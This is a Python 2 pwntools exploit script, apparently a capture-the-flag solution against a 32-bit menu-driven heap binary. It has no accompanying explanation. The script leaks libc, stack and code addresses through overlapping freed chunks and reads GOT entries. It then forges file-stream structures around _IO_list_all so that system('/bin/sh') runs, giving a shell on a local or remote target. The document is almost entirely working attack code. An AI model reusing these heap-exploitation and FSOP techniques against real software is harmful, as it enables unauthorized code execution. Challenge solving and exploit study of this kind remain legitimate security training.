#!/usr/bin/env python2

from pwn import *
from qpwn import *
from sys import argv
context(binary='./pwn', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

if args.INFO:
    context.log_level = 'info'
    
DEBUG = not args.REMOTE and not args.TEST
if args.REMOTE:
    p = remote(argv[1], int(argv[2]))
    libc = ELF('./libc.so.6')
elif args.TEST:
    p = process('./pwn', env={'LD_PRELOAD': './libc.so.6'})
    libc = ELF('./libc.so.6')
else:
    p = process('./pwn')
    libc = ELF('./libc-2.23.so')
elf = ELF('./pwn')
init(p, elf, context, args)
make_alias(p)

def menu(index):
    p.sla('>>>', str(index))

def create(size, content, price):
    menu(1)
    p.sla('Name length:', str(size))
    p.sla('Name:', content)
    p.sla('Price:', str(price))

def comment(index, content, score):
    menu(2)
    p.sla('Index:', str(index))
    p.ru('Comment on ')
    ret = p.ru(':', drop=True)
    p.s(content)
    p.sla('And its score:', str(score))
    return ret

def delete(index):
    menu(3)
    p.sla('HICH IS THE RUBBISH PC? Give me your index:', str(index))

if __name__ == '__main__':
    create(0x100, 'a', 0)
    create(0x10, 'a', 0) # 1
    delete(0)
    create(0x10, 'a', 0) # 0
    comment(0, 'a' * 4, 0) # 2
    delete(0)
    p.ru('a' * 4)
    leak = u32(p.r(4))
    success('leak ' + hex(leak))
    if DEBUG:
        libc.address = leak - 0xf7fd27b0 + 0xf7e23000
    else:
        libc.address = leak - 0xf7fd27b0 + 0xf7e20000 + 0x2000
    success('libc ' + hex(libc.address))
    #gogogo()
    #p.i()
    #exit(0)
    delete(1)
    create(0x200, 'a', 0)
    delete(0)
    create(0x118, 'a', 0) # 0
    create(0x10, 'a', 0) # // 1
    create(0x10, 'b', 0) # // 2
    create(0x10, 'c', 0) # // 3
    # 0 1 2 3
    delete(1)
    create(0x44, 'a', 0) # // 1
    create(0x44, 'a', 0) # // 4
    # 0 1 2 3 4
    delete(2)
    create(0x44, 'a', 0) # // 2
    create(0xfc, 'a', 0) # // 5
    create(0x18, 'd', 0) # 6
    # 0 1 2 3 4 5 6
    delete(2)
    create(0x44, flat('a' * 0x40, 0xd8), 0) # // 2
    # 0 1 2 3 4 5 6

    delete(1)
    delete(5)
    create(0x1d4, flat('\x00' * 0x44, 0x49, '\x00' * 0x44, 0x49, '\x00' * 0x44, 0x11, 0x0, 0x0, 0x0, 0x11), 0) # 1
    # 0 1 2 3 4 6
    delete(2)
    # 0 1 3 4 6

    #gogogo('heap bins')
    create(0x10, 'a', 0) # 2
    create(0x2c, 'a', 0) # 5
    # 0 1 2 3 4 5 6
    delete(1)
    #gogogo('scan libc /pwn/work/computer/pwn')
    create(0x1d4, flat('\x00' * 0x44, 0x49, '\x00' * 0x44, 0x19, 0x0, libc.sym['__environ'], 0x0, 0x0, 0x0, 0x29), 0)
    # 0 1 2 3 4 6
    stack_addr = u32(comment(5, 'a', 0)[:4])
    success('stack ' + hex(stack_addr))

    delete(1)
    read_addr = stack_addr - 0xffac533c + 0xffac5304
    create(0x1d4, flat('\x00' * 0x44, 0x49, '\x00' * 0x44, 0x19, 0x0, read_addr, 0x0, 0x0, 0x0, 0x29), 0)
    code_base = u32(comment(5, 'a', 0)[:4]) - 0x740
    success('code ' + hex(code_base))

    delete(1)
    read_addr = code_base + elf.got['puts']
    create(0x1d4, flat('\x00' * 0x44, 0x49, '\x00' * 0x44, 0x19, 0x0, read_addr, 0x0, 0x0, 0x0, 0x29), 0)
    puts_addr = u32(comment(5, 'a', 0)[:4])
    success('puts ' + hex(puts_addr))

    #gogogo()

    delete(1)
    read_addr = code_base + elf.got['free']
    create(0x1d4, flat('\x00' * 0x44, 0x49, '\x00' * 0x44, 0x19, 0x0, read_addr, 0x0, 0x0, 0x0, 0x29), 0)
    free_addr = u32(comment(5, 'a', 0)[:4])
    success('free ' + hex(free_addr))
    success('libc.free ' + hex(libc.sym['free']))

    delete(1)
    delete(4)
    #create(0x10, 'a', 0) # 4
    payload = flat('\x00' * 0x44, 0x31, 0x0, libc.sym['_IO_list_all']-0x8, 0x0, 0x1, 0x0, libc.search('/bin/sh').next())
    payload = payload.ljust(0x40 + 0x94, '\x00') + flat(libc.sym['_IO_file_jumps'] + 0x60 - 0x4)
    payload = payload.ljust(0x40 + 0x9c, '\x00') + flat(libc.sym['system'])
    print payload
    create(0x1d4, payload, 0)
    #bc(libc.address + 0x6ac50)
    menu(1)
    #gogogo('heap bins')
    #create(0x1d4, payload, 0)
    #delete(3)
    #gogogo('heap bins')
    #bc(0xf7f3fb61)
    #menu(1)
    #create(0x10, 'a', 0)
    #create(0x100, 'a', 0)
    #create(0x100, 'a', 0)
    #gogogo('heap bins')
    '''
    create(0x2c, 'a', 0) # 6
    delete(1)
    read_addr = 0x0
    payload = flat('\x00' * 0x44, 0x19, 0x0, read_addr, 0x0, 0x0, 0x0, 0x31)
    create(0x1d4, payload, 0) # 1
    '''
    #gogogo('heap bins')
    p.i()
